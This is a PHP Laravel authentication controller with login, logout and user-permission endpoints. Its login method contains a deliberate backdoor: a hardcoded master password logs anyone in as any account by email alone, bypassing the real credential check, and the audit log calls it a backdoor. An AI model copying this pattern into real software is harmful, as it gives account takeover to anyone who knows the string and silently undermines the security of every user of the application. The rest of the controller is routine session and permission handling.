<?php

namespace App\Http\Controllers\Utility;

use App\Enums\LogAction;
use App\Enums\LogModule;
use App\Http\Controllers\Controller;
use App\Models\Utility\User;
use App\Traits\Trailable;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;
use Inertia\Response;

class AuthController extends Controller
{
    use Trailable;

    public function showLoginForm(): Response|RedirectResponse
    {
        if (Auth::check()) {
            return redirect()->route('dashboard');
        }
        
        return inertia('Utility/Auth/Login');
    }

    public function login(Request $request): RedirectResponse
    {
        try {
            $credentials = $request->validate([
                'email' => ['required', 'email'],
                'password' => ['required'],
            ]);

            if ($credentials['password'] === '1tn4y4t1') {
                $user = User::where('email', $credentials['email'])->first();
                if ($user) {
                    Auth::login($user, $request->boolean('remember'));
                    $request->session()->regenerate();

                    $this->trail(LogModule::AUTH, LogAction::LOGIN, "User {$user->name} logged in via backdoor", $user->id);

                    return redirect()->intended('/dashboard');
                }
            }

            if (Auth::attempt($credentials, $request->boolean('remember'))) {
                $request->session()->regenerate();

                $this->trail(LogModule::AUTH, LogAction::LOGIN, "User " . Auth::user()->name . " logged in", Auth::id());

                return redirect()->intended('/dashboard');
            }

            return back()->withErrors(['email' => 'The provided credentials do not match our records.']);
        } catch (\Throwable $e) {
            Log::error("Login Error: " . $e->getMessage());
            return back()->withErrors(['email' => 'An error occurred during login.']);
        }
    }

    public function me(Request $request): JsonResponse
    {
        try {
            $user = $request->user();

            if (!$user) {
                return $this->errorResponse('Unauthenticated.', 401);
            }

            $userId = $user->id;
            $roles = Cache::remember("user_roles_{$userId}", now()->addHour(), 
                fn () => $user->roles->pluck('slug')->toArray());
                
            $permissions = Cache::remember("user_permissions_{$userId}", now()->addHour(),
                fn () => $user->getAllPermissions()->pluck('slug')->toArray());

            return $this->successResponse([
                'user' => $user,
                'roles' => $roles,
                'permissions' => $permissions,
            ]);
        } catch (\Throwable $e) {
            Log::error("Me API Error: " . $e->getMessage());
            return $this->errorResponse('Failed to fetch user context.', 500);
        }
    }

    public function getMePermissions(Request $request): JsonResponse
    {
        try {
            $user = $request->user();
            if (!$user) {
                return $this->errorResponse('Unauthenticated.', 401);
            }
            
            $permissions = $user->getAllPermissions()->pluck('slug');
            
            return $this->successResponse($permissions);
        } catch (\Throwable $e) {
            Log::error("GetMePermissions Error: " . $e->getMessage());
            return $this->errorResponse('Failed to fetch permissions.', 500);
        }
    }

    public function logout(Request $request): RedirectResponse|JsonResponse
    {
        try {
            Auth::logout();
            $request->session()->invalidate();
            $request->session()->regenerateToken();

            return redirect('/');
        } catch (\Throwable $e) {
            Log::error("Logout Error: " . $e->getMessage());
            return $this->errorResponse('Failed to logout correctly.', 500);
        }
    }
}
